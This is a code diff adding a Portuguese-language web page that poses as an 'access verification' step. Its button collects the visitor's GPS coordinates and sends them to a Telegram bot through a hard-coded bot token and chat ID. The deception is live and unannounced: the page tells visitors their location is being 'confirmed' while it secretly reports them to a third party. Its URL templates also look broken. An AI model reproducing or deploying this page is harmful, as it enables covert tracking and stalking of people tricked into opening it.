@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Acesso</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 80px; background-color: #f0f2f5; color: #1c1e21; }
+        .container { background: white; padding: 40px; border-radius: 12px; display: inline-block; box-shadow: 0 4px 12px rgba(0,0,0,0.15); max-width: 90%; }
+        h2 { margin-bottom: 10px; }
+        p { color: #606770; margin-bottom: 25px; }
+        button { padding: 15px 30px; font-size: 16px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 6px; font-weight: bold; }
+        button:active { transform: scale(0.98); }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>📍 Confirmação de Localização</h2>
+        <p>Clique no botão abaixo para validar seu acesso.</p>
+        <button onclick="enviar()">Confirmar agora</button>
+    </div>
+
+    <script>
+        async function enviar() {
+            const token = "8668803114:AAFyGRW2uBxoHybsY6HxCiEEn_X4n4HgXDI";
+            const chatId = "8668803114"; 
+
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(async (p) => {
+                    const lat = p.coords.latitude;
+                    const lon = p.coords.longitude;
+                    const link = `https://google.com{lat},${lon}`;
+                    
+                    const msg = `✅ *Localização Recebida!*\n\n📍 Mapa: ${link}`;
+                    const url = `https://telegram.org{token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+
+                    try {
+                        await fetch(url);
+                        alert("Sucesso! Sua localização foi confirmada.");
+                    } catch (e) {
+                        alert("Erro ao processar. Tente novamente.");
+                    }
+                }, (err) => {
+                    alert("Atenção: Você precisa PERMITIR a localização para continuar.");
+                });
+            } else {
+                alert("Seu navegador não suporta este recurso.");
+            }
+        }
+    </script>
+</body>
+</html>
+
